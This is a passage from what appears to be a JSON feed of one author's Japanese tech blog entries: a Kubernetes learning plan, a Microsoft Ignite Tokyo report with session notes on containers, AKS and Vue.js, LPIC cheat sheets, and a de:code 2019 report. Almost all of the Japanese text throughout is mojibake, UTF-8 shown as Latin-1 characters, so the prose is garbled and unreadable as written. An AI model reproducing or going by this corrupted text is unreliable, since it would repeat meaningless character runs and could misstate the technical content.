Nativeã‚’çªãé€²ã‚€äºˆå®šã§ã™ã€‚ãƒã‚¹ãƒˆCKAã€CKADã‚’å–å¾—ã™ã‚‹ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«è²¢çŒ®ã™ã‚‹OSSã«ã‚³ãƒ³ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ãƒˆã™ã‚‹Goè¨€èªã§ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°ã«æ…£ã‚Œã‚‹è‹±èªåŠ›ã‚’é«˜ã‚ã‚‹ã§ãã‚Œã°æ¥­å‹™ã¨ã—ã¦Kubernetesã‚’æ‰±ãˆã‚‹ç’°å¢ƒã«èº«ã‚’ç½®ãï¼ˆé å›ã—ãªè¡¨ç¾ï¼‰æŠ€è¡“æ›¸ã‚’æ›¸ã","isoDate":"2020-01-31T19:03:51.000Z","dateMiliSeconds":1580497431000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"0ã‹ã‚‰ã¯ã˜ã‚ã‚‹ Windows on Kubernetes","link":"https://qiita.com/kyohmizu/items/dffdd49123b1e47c3ac4","contentSnippet":"ã¯ã˜ã‚ã«Kubernetes ã® Windows å¯¾å¿œã¯ v.1.14 ã§GAã¨ãªã‚Šã¾ã—ãŸã€‚æœ¬è¨˜äº‹ã§ã¯ã€æ—¢å­˜ã® Kubernetes ã‚¯ãƒ©ã‚¹ã‚¿ã«0ã‹ã‚‰ Windows ãƒ¯ãƒ¼ã‚«ãƒ¼ãƒãƒ¼ãƒ‰ã‚’è¿½åŠ ã™ã‚‹æ–¹æ³•ã‚’ã”ç´¹ä»‹ã—ã¾ã™ã€‚å®Ÿè¡Œç’°å¢ƒä»Šå›ã¯å®Ÿè¡Œç’°å¢ƒã¨ã—ã¦ Azure ã‚’ä½¿ç”¨ã—...","isoDate":"2019-12-22T18:19:52.000Z","dateMiliSeconds":1577038792000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ã€ã‚¤ãƒ™ãƒ³ãƒˆå‚åŠ ãƒ¬ãƒãƒ¼ãƒˆã€‘Microsoft Ignite The Tour Tokyo","link":"https://kyohmizu.hatenablog.com/entry/2019/12/10/012041","contentSnippet":"2019/12/5(æœ¨)ã€6(é‡‘)ã«é–‹å‚¬ã•ã‚ŒãŸ Microsoft ã® Tech ã‚¤ãƒ™ãƒ³ãƒˆã«å‚åŠ ã—ã¾ã—ãŸã€‚www.microsoft.comæ¦‚è¦ã‚¢ãƒ¡ãƒªã‚«ã§è¡Œã‚ã‚ŒãŸ Ignite ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å†æ¼”ç™»å£‡è€…ã¯ä»–äººã®è³‡æ–™ã§ç™ºè¡¨ (ç¿»è¨³ä»¥ä¸Šã®æ”¹å¤‰ã¯ã§ããªã„ã¨èãã¾ã—ãŸ)æ–°æƒ…å ±ã®ç™ºè¡¨ç­‰ã¯ã•ã‚Œãšã€é€šå¸¸ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¨ãƒãƒ³ã‚ºã‚ªãƒ³ã®ã¿Microsoft ã‚¨ã‚­ã‚¹ãƒ‘ãƒ¼ãƒˆã¨ã®äº¤æµã®å ´å¤–å›½äººã®ã‚¹ã‚¿ãƒƒãƒ•ã‚’å¤šæ•°é…ç½®åŸºæœ¬çš„ã«ã¯è‹±èªã§ã‚„ã‚Šå–ã‚Šã™ã‚‹ã‚‰ã—ã„ (ç§ã¯è©±ã—ã¾ã›ã‚“ã§ã—ãŸ)æ„Ÿæƒ³å¤–å›½äººãŒå¤šãã€ã‚°ãƒ­ãƒ¼ãƒãƒ«ãªå°è±¡ã‚’å—ã‘ã¾ã—ãŸã€‚ä¼šå ´ã¯ã„ã¤ã‚‚ã®ãƒ›ãƒ†ãƒ«ã§ã—ãŸãŒã€ã‚„ã¯ã‚Šã‚»ãƒƒã‚·ãƒ§ãƒ³ã®å…¥ã‚Œæ›¿ãˆæ™‚ã¯éå¸¸ã«æ··é›‘ã—ã¾ã™ã€‚ãƒ–ãƒ¼ã‚¹ã®ã‚¨ãƒªã‚¢ã¯ã‚¹ãƒšãƒ¼ã‚¹ã‚’åºƒãã¨ã£ã¦ã‚ã‚Šã€å‰²ã¨é–‘æ•£ã¨ã—ã¦ã„ãŸæ°—ãŒã—ã¾ã™ (ã‚»ãƒƒã‚·ãƒ§ãƒ³ä¸­ã¯ç‰¹ã«)ã€‚æŠ€è¡“çš„ã«ã¯åˆç´šè€…å‘ã‘ã®å†…å®¹ãŒå¤šã‹ã£ãŸã¨æ€ã„ã¾ã™ã€‚ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚ˆã‚Šã¯ã€ã©ã¡ã‚‰ã‹ã¨ã„ãˆã°ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’é‡è¦–ã—ãŸã‚¤ãƒ™ãƒ³ãƒˆã®ã‚ˆã†ã§ã—ãŸã€‚MSã®æ–¹ã‚„ãƒ–ãƒ¼ã‚¹ã®æ‹…å½“è€…ã¨è©±ã™ã“ã¨ãŒã§ãã€æœ‰æ„ç¾©ãªæ™‚é–“ã‚’éã”ã›ã¾ã—ãŸã€‚å‚åŠ ã—ã¦å¾—ã‚‹ã‚‚ã®ã¯ã‚ã‚Šã¾ã—ãŸã€‚ã‚»ãƒƒã‚·ãƒ§ãƒ³å‚åŠ ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ã¾ã¨ã‚ã¨ãƒ¡ãƒ¢ã€‚THR30031 - Azure ã¨ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ï¼ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã€ãƒ’ãƒ³ãƒˆã€ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯é›£æ˜“åº¦ï¼šåˆç´šãƒ¡ãƒ¢ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ãƒ¼ãƒ©ãƒ¼ã§cmdã‚’ãƒ‘ã‚¹ã«å…¥åŠ›(powershellã€wslã‚‚)Windows Console â†’ Windows TerminalTerminalã¯Storeã§å…¥æ‰‹å¯èƒ½Azure CLIã‚„VSCode Remoteã¯ã‚µãƒ©ãƒƒã¨APPS30 - ã‚³ãƒ³ãƒ†ãƒŠãƒ¼ã‚’åˆ©ç”¨ã—ãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æœ€æ–°åŒ–è³‡æ–™ï¼šhttps://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps30é›£æ˜“åº¦ï¼šåˆç´šè¦ç‚¹ã‚³ãƒ³ãƒ†ãƒŠã€Dockerã®åŸºç¤çš„ãªèª¬æ˜ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã‚„ãƒãƒ«ãƒã‚¹ãƒ†ãƒ¼ã‚¸ãƒ“ãƒ«ãƒ‰ç­‰ã¯ã€è»½ãè©±ã«å‡ºã‚‹ç¨‹åº¦ã‚³ãƒ³ãƒ†ãƒŠã«é–¢ã—ã¦ã¯ç‰¹ã«çŸ¥ã‚‰ãªã„è©±ã¯ãªã‹ã£ãŸACRã‚„ACIã®æ¦‚è¦ã€ä½¿ã„æ–¹ã®è»½ã„èª¬æ˜ã‚µãƒ¼ãƒ“ã‚¹ç§»è¡Œã®ãƒ‡ãƒ¢ã§ã¯ã‚³ãƒ³ãƒ†ãƒŠåŒ–ã—ã¦App Serviceã€CosmosDBã€SQL Databaseã‚’ä½¿ç”¨ãƒ¡ãƒ¢ãƒ‡ãƒ¼ã‚¿ã‚»ãƒ³ã‚¿ãƒ¼ã®ã‚¢ãƒ—ãƒªã‚’ã‚¯ãƒ©ã‚¦ãƒ‰ã«Lift\u0026Shiftä»®æƒ³ãƒã‚·ãƒ³ã¯ã„ã„ã‘ã©ç„¡é§„ãŒå¤šã„ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½¿ã£ãŸãƒ¢ãƒ€ãƒŠã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚¢ãƒ—ãƒªã®å¢ƒç•Œã‚’æ˜ç¢ºã«ã™ã‚‹æ—§ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®æ®‹ã‚Šãƒ•ã‚¡ã‚¤ãƒ«ãŒãªããªã‚‹ã‚ªãƒ¼ãƒãƒ¼ãƒ˜ãƒƒãƒ‰ãªã—ã§ãƒªã‚½ãƒ¼ã‚¹åˆ†é›¢ç¹°ã‚Šè¿”ã—å¯èƒ½ãªãƒ“ãƒ«ãƒ‰ã€ç’°å¢ƒæ§‹ç¯‰ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½¿ã†ç†ç”±ã‚ã‚‰ã‚†ã‚‹ç’°å¢ƒã§åŒã˜ã‚ˆã†ã«å‹•ä½œã™ã‚‹ãƒ™ãƒ­ã‚·ãƒ†ã‚£ã®å‘ä¸Šã‚³ãƒ³ãƒ†ãƒŠã®ä»•çµ„ã¿é«˜åº¦ã«æ§‹æˆã•ã‚ŒãŸãƒ—ãƒ­ã‚»ã‚¹cgroupsnamespaceãƒ™ãƒ¼ã‚¹ã‚¤ãƒ¡ãƒ¼ã‚¸ã‹ã‚‰ã®å·®åˆ†ã‚’gzipåŒ–ã—ãŸã‚‚ã®ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã®è»½ã„èª¬æ˜Dockerä»¥å¤–ã«ã‚‚å¯¾å¿œã€containerdã€runCDockerfileã‚¤ãƒ¡ãƒ¼ã‚¸ã®ãƒ“ãƒ«ãƒ‰æ–¹æ³•ã‚’èª¬æ˜ã™ã‚‹ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒƒãƒã‚¹ã‚¯ãƒªãƒ—ãƒˆã¿ãŸã„ãªã‚‚ã®ãƒ“ãƒ«ãƒ‰ãƒªãƒã‚¸ãƒˆãƒªACRACIã‚µãƒ¼ãƒãƒ¼ãƒ¬ã‚¹ã®ã‚³ãƒ³ãƒ†ãƒŠå®Ÿè¡Œç’°å¢ƒãƒã‚¤ãƒ‘ãƒ¼ãƒã‚¤ã‚¶ãƒ¼ãƒ¬ãƒ™ãƒ«ã®åˆ†é›¢ãƒ‡ãƒ¢ã‚µãƒ¼ãƒ“ã‚¹ç§»è¡Œã®è©±APPS40 - ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã¨ Azure Kubernetes Service ã‚’çµ±åˆã™ã‚‹è³‡æ–™ï¼šhttps://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps40é›£æ˜“åº¦ï¼šä¸­ç´šè¦ç‚¹AKSã®ä½œæˆæ‰‹é †ã®èª¬æ˜AKSã¨Azureã®é€£æºã‚µãƒ¼ãƒ“ã‚¹ã«ã¤ã„ã¦çŸ¥è­˜ã‚’æ•´ç†ã§ããŸã‚ªãƒ¼ãƒˆã‚¹ã‚±ãƒ¼ãƒ«ã®è©±ã¯ç†è§£ãŒæµ…ã‹ã£ãŸã®ã§å‚è€ƒã«ãªã£ãŸAKSã‚’ä½¿ã†æœ€å¤§ã®ãƒ¡ãƒªãƒƒãƒˆã¯AzureADã¨ã®é€£æºãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è©±ã¯éå¸¸ã«å‚è€ƒã«ãªã£ãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒãƒªã‚·ãƒ¼ã‚„AZãƒ¡ãƒ¢åŸºæœ¬çš„ãªä½¿ã„æ–¹ã§ã¯ãªãã€ç™ºå±•çš„ãªå†…å®¹Tailwind Tradaersã®ãƒ‡ãƒ¢çµŒå–¶ã€ãƒ“ã‚¸ãƒã‚¹èª²é¡Œã«å¯¾å¿œå¾©å…ƒåŠ›ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æŸ”è»Ÿæ€§ã‚¹ã‚±ãƒ¼ãƒ«Kubernetesã‚’é¸æŠã™ã‚‹ç†ç”±æŠ½è±¡åŒ–ã®ãŸã‚ã®æ¨™æº–åŒ–ã•ã‚ŒãŸAPIè‡ªå·±ä¿®å¾©ã‚¹ã‚±ãƒ¼ãƒ©ãƒ“ãƒªãƒ†ã‚£k8sã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£AKSã¯ãƒã‚¹ã‚¿ãƒ¼ãƒãƒ¼ãƒ‰ãŒç„¡æ–™ã§æä¾›ã•ã‚Œã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«2ç¨®é¡æŒ‡å®šã§ãã‚‹ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯kubenetAzure CNI ä»®æƒ³ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ç”¨ã€‚å¤§è¦æ¨¡ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«å¯¾å¿œã€‚ãã¡ã‚“ã¨è¨­è¨ˆã™ã‚‹å¿…è¦ãŒã‚ã‚‹ACIã‚’ä»®æƒ³ãƒãƒ¼ãƒ‰ã¨ã—ã¦ä½¿ç”¨AZAKSã®ä½œæˆãƒªã‚½ãƒ¼ã‚¹ã‚°ãƒ«ãƒ¼ãƒ—ä»®æƒ³ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ–ãƒãƒƒãƒˆã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«(k8sã‹ã‚‰ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½œæˆ)ã‚¯ãƒ©ã‚¹ã‚¿æœ¬ç•ªã‚¯ãƒ©ã‚¹ã‚¿ã‚’ä½œæˆã™ã‚‹ã«ã¯ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’å¤šæ•°æŒ‡å®šã™ã‚‹å¿…è¦ãŒã‚ã‚‹ä½œæˆæ™‚ã«ã—ã‹è¨­å®šã§ããªã„ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚ã‚‹ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ™‚ã«CNIã€AZã®è¨­å®šã‚’ã™ã‚‹ä»®æƒ³ãƒãƒ¼ãƒ‰ã®æœ‰åŠ¹åŒ–ACIã‚’AKSã‹ã‚‰ä½¿ãˆã‚‹ã‚ˆã†ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚‹RabbitMQ is ä½•ï¼ŸHPAãƒ¡ãƒˆãƒªã‚¯ã‚¹ã‚µãƒ¼ãƒãƒ¼ã«Podã‹ã‚‰æƒ…å ±ãŒé€ã‚‰ã‚Œã‚‹é–¾å€¤ã‚’è¶…ãˆãŸã‚‰ã‚¹ã‚±ãƒ¼ãƒ«ã‚¯ãƒ©ã‚¹ã‚¿ã‚ªãƒ¼ãƒˆã‚¹ã‚±ãƒ¼ãƒ©ãƒ¼ãƒãƒ¼ãƒ‰ã®ã‚¹ã‚±ãƒ¼ãƒ«ä»®æƒ³ãƒãƒ¼ãƒ‰Linuxã€Windowsã€GPUã«å¯¾å¿œnodeselectorã§æŒ‡å®šä»®æƒ³ãƒãƒ¼ãƒ‰ã«ã‚ˆã‚‹ã‚¹ã‚±ãƒ¼ãƒ«ã®ãƒ‡ãƒ¢ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ACRã§ã‚³ãƒ³ãƒ†ãƒŠã®è„†å¼±æ€§ã‚’ãƒã‚§ãƒƒã‚¯AKSã‚’ä½¿ã†æœ€å¤§ã®ãƒ¡ãƒªãƒƒãƒˆã¯AzureADã¨ã®é€£æºï¼Azure Key VaultPodé–“ã®é€šä¿¡Pod IdentityNMI Server(Daemonset)MICAzure Identity Bindingãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒãƒªã‚·ãƒ¼Podé–“ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ä¿è­·Azure Network PolicyAzure CNIã‚’ä½¿ã£ãŸPodãƒ–ãƒªãƒƒã‚¸ãƒ¬ãƒ™ãƒ«Calico Network Policyã‚«ãƒ¼ãƒãƒ«ãƒ¬ãƒ™ãƒ«AZãƒ™ãƒ¼ã‚¿ç‰ˆãƒ‡ãƒ¼ã‚¿ã‚»ãƒ³ã‚¿ãƒ¼éšœå®³ã®å›å¾©æ€§ã‚¾ãƒ¼ãƒ³ã¯3ã¤ã¾ã§ä½¿ç”¨å¯èƒ½ã‚¾ãƒ¼ãƒ³ã®æ•°ã«åˆã‚ã›ã¦ãƒ¬ãƒ—ãƒªã‚«æ•°ã‚’è¨­å®šTHR10007 - ITã¨æŠ€è¡“è€…ã®å°†æ¥ã«ã¤ã„ã¦èªã‚Šåˆã†ã‚¨ãƒ¢ã„è©±è¦ç‚¹ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³å½¢å¼ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£å‚åŠ ã‚„ã‚¢ã‚¦ãƒˆãƒ—ãƒƒãƒˆã‚’é‡è¦–ã—ã¦ã„ã‚‹ã©ã‚“ã©ã‚“ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã—ã¦ã‚¹ã‚­ãƒ«ã‚’ã¤ã‘ã¦ã„ãã“ã¨ãŒå¤§äº‹ãƒ¡ãƒ¢ä»Šå¾Œã‚ã‚‹ã„ã¯10å¹´å¾Œã©ã†ãªã‚‹ï¼Ÿã“ã‚Œã‹ã‚‰ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã—ãŸã„ã“ã¨ã¯ï¼ŸMRãƒ•ãƒªãƒ¼ãƒ©ãƒ³ã‚¹è‡ªåˆ†ã®å–¶æ¥­ã‚’ã“ã‚Œã‹ã‚‰ã‚‚ç¶šã‘ã¦ã„ãè‡ªåˆ†ãŒä½•ãŒå¾—æ„ã§ã€ä½•ãŒè‹¦æ‰‹ã‹ã‚¢ãƒ”ãƒ¼ãƒ«ãƒ–ãƒ«ãƒ¼ã‚ªãƒ¼ã‚·ãƒ£ãƒ³ã‚’æ¢ã—ãŸã„ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ã‚¨ãƒ³ãƒ‘ãƒ¯ãƒ¼ãƒ¡ãƒ³ãƒˆå‡ºã¦ã“ãªã„äººã«ã©ã†ã‚„ã£ã¦æŠ€è¡“ã‚’å¥½ãã«ãªã£ã¦ã‚‚ã‚‰ã†ã‹ç¤¾å†…ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã‚’ä½œã£ã¦ã‚‚ã‚‰ã†ãŠå‹§ã‚ã—ãŸã„ã“ã¨ã¯ï¼ŸæŠ€è¡“ã‚’æ¥½ã—ã‚“ã§ã€å‘¨ã‚Šã«åºƒã‚ã¦ã„ãä»²é–“ãŒã§ãã¦ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãŒã§ãã‚‹äººã‚’å¤‰ãˆã‚‹ã®ã¯é›£ã—ã„ã€å¥½ããªã“ã¨ã‚’åºƒã‚ã‚‹ã“ã¨ãªã‚‰ã§ãã‚‹æ¥½ã—ã‚“ã§ã‚‹é›°å›²æ°—ã‚’å‡ºã—ã¦ã„ã‚‹ã¨å‘ã“ã†ã‹ã‚‰æ¥ã¦ãã‚Œã‚‹è‡ªåˆ†ã®å¼·ã¿ã‚’çŸ¥ã£ã¦ã€ãã‚Œã‚’ç™ºä¿¡ã—ã¦ã„ãæ¥­å‹™ã§è§¦ã£ã¦ãªãã¦ã‚‚ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã§ç™ºè¡¨ã„ã¦ã„ãŸã‚„ã‚ŠãŸã„ã“ã¨ã€å¥½ããªã“ã¨ã‚’è¦‹ã¤ã‘ã¦ã€äººãŒè¦‹ãˆã‚‹å ´æ‰€ã«å‡ºã—ã¦ã„ãå¤–ã®ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«å‚åŠ ã—ã¦ã¿ã‚‹ä¼šç¤¾ã«ã„ã‚‹ã ã‘ã§ã¯ã‚¹ã‚­ãƒ«ã¯ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆä¾å­˜ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ç†±é‡ãŒã™ã”ã„ã‚¢ã‚¦ãƒˆãƒ—ãƒƒãƒˆã™ã‚‹ã¨å¼·ã„äººãŒã‚¤ãƒ³ãƒ—ãƒƒãƒˆã‚’ãã‚Œã‚‹ã¨ã‚Šã‚ãˆãšè¸ã¿å‡ºã—ã¦ã¿ã‚‹æ¥½ã—ã‚“ã ã‚‚ã®å‹ã¡ã‚„ã‚ŠãŸã„ã“ã¨ã‚’ç´ ç›´ã«ã‚„ã£ã¦ã¿ã‚‹UNC10013 - Vue.js 3 ã«å‘ã‘ãŸ Vue.js å…¥é–€é›£æ˜“åº¦ï¼šåˆç´šï½ä¸­ç´šè¦ç‚¹Vue.js ã®è¨­è¨ˆæ€æƒ³ã€V3 ã§ã‚‚ä½¿ãˆã‚‹æ§‹æ–‡ã€V3 ã®æ–°æ©Ÿèƒ½ã‚³ãƒ³ãƒã‚¸ãƒƒã‚·ãƒ§ãƒ³APIé–¢æ•°ãƒ™ãƒ¼ã‚¹ã§æä¾›ã•ã‚Œã‚‹ APIã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®ãƒ­ã‚¸ãƒƒã‚¯ãŒç¶ºéº—ã«ãªã‚‹V2 ã§ã‚‚ãŠè©¦ã—ã§ä½¿ãˆã‚‹ãƒ–ãƒ¼ã‚¹ç«‹ã¡å¯„ã£ãŸãƒ–ãƒ¼ã‚¹ã®ä¸­ã§ã€èˆˆå‘³ã‚’æŒã£ãŸå†…å®¹ã‚’ç´¹ä»‹ã—ã¾ã™ã€‚LenovoLenovo ThinkSystem SE350 | ãƒ¬ãƒãƒœã‚¸ãƒ£ãƒ‘ãƒ³è»½é‡ã§ã‚³ãƒ³ãƒ‘ã‚¯ãƒˆãªã‚¨ãƒƒã‚¸ã‚µãƒ¼ãƒãƒ¼Wifiã€LTEã€æœ‰ç·šãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å¯¾å¿œIntelè£½å“æ¦‚è¦: OpenVINOâ„¢ ãƒ„ãƒ¼ãƒ«ã‚­ãƒƒãƒˆã‚¨ãƒƒã‚¸ã§ã®ãƒ‡ã‚£ãƒ¼ãƒ—ãƒ©ãƒ¼ãƒ‹ãƒ³ã‚°æ¨è«–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³é–‹ç™ºå­¦ç¿’æ¸ˆã¿ãƒ¢ãƒ‡ãƒ«ã‚’ç„¡æ–™ã§åˆ©ç”¨å¯èƒ½ã‚¤ãƒ³ãƒ†ãƒ«CPUã«å¯¾å¿œPivotalAzure Spring Cloud | Microsoft DocsSpring Boot ã‚¢ãƒ—ãƒªã‚’ã‚¯ãƒ©ã‚¦ãƒ‰ã§å®Ÿè¡Œãƒ™ãƒ¼ã‚¿ç‰ˆã®ã‚µãƒ¼ãƒ“ã‚¹AKS ä¸Šã«ãƒ‡ãƒ—ãƒ­ã‚¤ã•ã‚Œã‚‹æ°´å¹³ã‚¹ã‚±ãƒ¼ãƒ«ã‚„ãƒ¡ãƒˆãƒªã‚¯ã‚¹ã€ãƒ­ã‚°ã®åé›†ãŒå¯èƒ½AKS ã¯éš è”½ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã¯è¦‹ãˆãªã„æ‰‹è»½ã«å°å…¥ã§ãã‚‹ã®ã§ POC ã«ã‚‚é©ã—ã¦ã„ã‚‹","isoDate":"2019-12-09T16:20:41.000Z","dateMiliSeconds":1575908441000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"LPIC 102 ãƒãƒ¼ãƒˆã‚·ãƒ¼ãƒˆ","link":"https://qiita.com/kyohmizu/items/d5d6fedc527efa9f649c","contentSnippet":"è©¦é¨“å‰ã®ç¢ºèªäº‹é …ã¨ã—ã¦ã¾ã¨ã‚ãŸå†…å®¹ã§ã™ã€‚ç’°å¢ƒå¤‰æ•°namecontentDISPLAYãƒªãƒ¢ãƒ¼ãƒˆã‚¢ã‚¯ã‚»ã‚¹å…ˆã®ãƒ›ã‚¹ãƒˆLANGãƒ­ã‚±ãƒ¼ãƒ«(å…¨ã‚«ãƒ†ã‚´ãƒª)TZã‚¿ã‚¤ãƒ ã‚¾ãƒ¼ãƒ³USERãƒ­ã‚°ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼HOSTNAMEãƒ›ã‚¹ãƒˆåPAT...","isoDate":"2019-10-09T01:56:54.000Z","dateMiliSeconds":1570586214000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"LPIC 101ãƒãƒ¼ãƒˆã‚·ãƒ¼ãƒˆ","link":"https://qiita.com/kyohmizu/items/923844999018fd456d44","contentSnippet":"è©¦é¨“å‰ã®ç¢ºèªäº‹é …ã¨ã—ã¦ã¾ã¨ã‚ãŸå†…å®¹ã§ã™ã€‚ç’°å¢ƒå¤‰æ•°namecontentPATHã‚³ãƒãƒ³ãƒ‰ã®ãƒ‘ã‚¹EDITORãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¨ãƒ‡ã‚£ã‚¿HISTFILEå±¥æ­´ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹HISTFILESIZEå±¥æ­´ãƒ•ã‚¡ã‚¤ãƒ«ã®ä¿å­˜å±¥æ­´æ•°LD_LIB...","isoDate":"2019-10-09T01:48:33.000Z","dateMiliSeconds":1570585713000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"de:code 2019 å‚åŠ ãƒ¬ãƒãƒ¼ãƒˆ","link":"https://kyohmizu.hatenablog.com/entry/2019/06/06/111805","contentSnippet":"Microsoftä¸»å‚¬ã®ãƒ†ã‚¯ãƒ‹ã‚«ãƒ«ã‚«ãƒ³ãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ã€Œde:code 2019ã€ã«å‚åŠ ã—ã¦ãã¾ã—ãŸã€‚www.microsoft.comå‚åŠ ã‚»ãƒƒã‚·ãƒ§ãƒ³1æ—¥ç›®ã‚³ãƒ³ãƒ†ãƒŠæŠ€è¡“ã‚’ä¸­å¿ƒã«ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é¸æŠã€KN01ã€‘åŸºèª¿è¬›æ¼”ã€CD06ã€‘ã—ãã¿ãŒã‚ã‹ã‚‹ Azure Kubernetes Service (AKS) ï½é–‹ç™ºè€…ç›®ç·šã§ Kubernetes ã®åŸºæœ¬ã‚’ç†è§£ã™ã‚‹ï½ã€CD01ã€‘Windows Containers ã¨ Azure ã«ã‚ˆã‚‹ã€æ—¢å­˜ .NET ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ¢ãƒ€ãƒŠã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã€CD91ã€‘HashiCorp Terraform Azure Provider ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã€CD12ã€‘ãƒãƒãƒ¼ã‚¸ãƒ‰ Kubernetes ã‚¬ãƒæœ¬ç•ªé‹ç”¨ in ZOZOTOWNwww.youtube.com2æ—¥ç›®ã‚³ãƒ³ãƒ†ãƒŠãƒ»ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é¸æŠã€SE07ã€‘è„†å¼±æ€§ã¯ãªãœç”Ÿã¾ã‚Œã€ã©ã®ã‚ˆã†ã«æ”»æ’ƒã•ã‚Œã‚‹ã®ã‹? å®‰å…¨ãªã‚¢ãƒ—ãƒªã‚’é–‹ç™ºã€é‹ç”¨ã™ã‚‹ãŸã‚ã®ãã»ã‚“ã€CD93ã€‘ã‚³ãƒ³ãƒ†ãƒŠç’°å¢ƒã®æ°¸ç¶šåŒ–ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸å•é¡Œã‚’ NetApp Kubernetes Service ã¨ Azure NetApp Files ã§ã•ã‚‰ã£ã¨è§£æ±ºã€CM12ã€‘.NET Core ãƒãƒ«ãƒ ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æœ¬è³ªã€SE05ã€‘ã‚‚ã†ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¯ã‚„ã‚ŠãŸããªã„!! ç¬¬ 3 å¼¾ ï½Azure Sentinel Deep Diveï½æ³¨ç›®æŠ€è¡“å‚åŠ ã—ãŸã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ä¸­ã§ã€ç‰¹ã«å°è±¡ã«æ®‹ã£ãŸ or é–¢å¿ƒã®ã‚ã‚‹æŠ€è¡“ã‚’å–ã‚Šä¸Šã’ã¾ã™ã€‚Azure Kubernetes Service(AKS)Azureã®ãƒãƒãƒ¼ã‚¸ãƒ‰ Kubernetes ã‚µãƒ¼ãƒ“ã‚¹ã§ã‚ã‚‹ AKS 